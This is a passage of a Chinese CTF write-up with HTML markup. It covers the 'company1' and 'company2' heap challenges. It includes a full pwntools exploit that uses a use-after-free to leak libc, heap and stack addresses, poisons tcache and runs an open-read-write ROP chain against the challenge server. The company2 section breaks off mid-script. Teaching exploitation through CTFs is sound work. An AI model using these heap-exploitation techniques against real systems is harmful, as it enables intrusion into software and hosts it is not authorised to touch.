class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000004e</span>  <span class="keyword">if</span> (A != getdents) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，只能打 ORW（没 ban getdents，可能是未知文件名的 ORW）</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>UAF 漏洞的变种：没有置空堆上的 <code>chunk_list[index]-&gt;data</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]-&gt;data);</span><br><span class="line">  chunk_list[index] = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>不管 <code>chunk_list[index]-&gt;data</code> 上是否有值，它都会被释放</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>程序的打印模块有限制，需要绕过：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(positiong, <span class="string">&quot;HR&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Sorry %syou&#x27;re not have access to this\n&quot;</span>, nameg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先申请一个 chunk，往 <code>chunk_list[index]-&gt;data</code> 上写入 <code>positiong</code>，尝试直接释放 <code>positiong</code> 将其写入 tcache 中（布置好 fake chunk）</p>
<p>再次申请回来时就可以控制 <code>positiong</code> 和 <code>chunk_list</code></p>
<p>用这种思路可以泄露 libc_base heap_base stack_addr，然后控制 <code>chunk_list</code> 实现堆重叠，最后劫持栈就可以了</p>
<p>由于不清楚服务器上的 flag 名称，因此需要利用 getdents 获取 flag 名称，打印的数据如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> �l </span><br><span class="line">   \x00\x00\x00\x84|���!<span class="number">6</span>\x18..\x00\x00�l</span><br><span class="line">                                         \x00\x0��\xb3 \xac;@\x00lag_you_found_this_my_treasure_leaked.txt\x00\x00�l</span><br><span class="line">               \x00\x00p]\xa9</span><br><span class="line">\x176j\x18.\x00\x00\x04l\x0c\x00\x00\xff\xff\xff\xff\xff\xff\xff\x7f \x00ompany\x00\x00\x0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0</span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./company1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;company.chal.crewc.tf&#x27;</span>,<span class="string">&#x27;17001&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x401708\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,name=<span class="string">&quot;1&quot;</span>,position=<span class="string">&quot;HR&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">6</span>+p64(<span class="params"><span class="number">0x61</span></span>),salary=<span class="number">0</span></span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;Name:&quot;</span>,name)</span><br><span class="line">    sa(<span class="string">&quot;Position:&quot;</span>,position)</span><br><span class="line">    sla(<span class="string">&quot;Salary:&quot;</span>,<span class="built_in">str</span>(salary))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">index,index2,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;you are? &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;feedback? &quot;</span>,<span class="built_in">str</span>(index2))</span><br><span class="line">    sa(<span class="string">&quot;Feedback:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;see? &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">target_addr = <span class="number">0x404070</span></span><br><span class="line">__libc_start_main = <span class="number">0x403FF0</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">sla(<span class="string">&quot;name? &quot;</span>,name)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add2(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x20</span>+p64(target_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i+<span class="number">1</span>)</span><br><span class="line">    add2(i+<span class="number">1</span>,i+<span class="number">1</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,name=<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">&quot;HR&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">6</span>,position=p64(__libc_start_main)*<span class="number">3</span>+p64(<span class="number">0x404098</span>-<span class="number">0x40</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Feedback: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr-<span class="number">0x23ac0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stack_libc = libc_base - <span class="number">0x25c0</span> </span><br><span class="line">success(<span class="string">&quot;stack_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_libc))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add2(<span class="number">10</span>,<span class="number">10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">&quot;HR&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">6</span>+p64(stack_libc)*<span class="number">3</span>+p64(<span class="number">0x404098</span>-<span class="number">0x40</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Feedback: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">stack_base = leak_addr</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>,name=<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+<span class="string">&quot;HR&quot;</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">6</span>,position=p64(<span class="number">0x4040c0</span>)*<span class="number">3</span>+p64(<span class="number">0x404098</span>-<span class="number">0x40</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Feedback: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr-<span class="number">0x20d0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x401770</span></span><br><span class="line">ret_stack = stack_base - <span class="number">0x68</span></span><br><span class="line">bss_addr = <span class="number">0x404020</span> + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000040143</span> + libc_base</span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000000240e5</span> + libc_base</span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000002573e</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000026302</span> + libc_base</span><br><span class="line">syscall_ret = <span class="number">0x00000000000e3859</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;a&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base-<span class="number">0x30</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall_ret) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line">add2(<span class="number">9</span>,<span class="number">9</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x20</span>+p64(heap_base+<span class="number">0x1e00</span>))</span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">key = (heap_base + <span class="number">0x1e30</span>)&gt;&gt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;ret_stack &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(ret_stack))</span><br><span class="line">add(<span class="number">9</span>,name=<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,position=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64((ret_stack-<span class="number">8</span>)^key))</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause() # b* 0x401770</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add2(<span class="number">3</span>,<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack_base+<span class="number">0xa8</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"> </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0xa8</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"> </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(stack_base+<span class="number">0xa8</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">&quot;./flag_you_found_this_my_treasure_leaked.txt\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload  = &quot;&quot;</span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(2)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(stack_base+0xd0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(78)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(3)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(bss_addr+0x200)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(4096)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload += p64(pop_rax_ret) + p64(1)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) + p64(1)</span></span><br><span class="line"><span class="string">payload += p64(pop_rsi_ret) + p64(bss_addr+0x200)</span></span><br><span class="line"><span class="string">payload += p64(pop_rdx_ret) + p64(0x200)</span></span><br><span class="line"><span class="string">payload += p64(syscall_ret)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = payload.ljust(0x100,&quot;1&quot;)</span></span><br><span class="line"><span class="string">payload += &quot;.&quot;+&quot;\x00&quot;*7</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="company2"><a href="#company2" class="headerlink" title="company2"></a>company2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.37</span><span class="number">-0u</span>buntu2)</span> stable release version 2.37.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">company: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">09</span>dfe618c92dba9281d433d52c79577575661c73, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>有 UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">  chunk_list[index]-&gt;Size = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序可以进行泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &lt;= <span class="number">0xF</span> &amp;&amp; chunk_list[index] &amp;&amp; chunk_list[index]-&gt;Size )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Feedback (%ld): &quot;</span>, chunk_list[index]-&gt;Size - <span class="number">0x48</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;chunk_list[index]-&gt;data, chunk_list[index]-&gt;Size - <span class="number">0x48</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用 UAF 配合程序提供的 <code>printf</code> 即可完成泄露：（注意堆风水的搭建）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x550</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x550</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x550</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x570</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x530</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">&quot;you are? &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sla(<span class="string">&quot;feedback? &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Feedback (&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;)&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f6c98</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + <span class="number">0x1f7680</span></span><br><span class="line">success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x540</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x540</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">&quot;you are? &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sla(<span class="string">&quot;feedback? &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Feedback (&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">eval</span>(ru(<span class="string">&quot;)&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x1268</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span 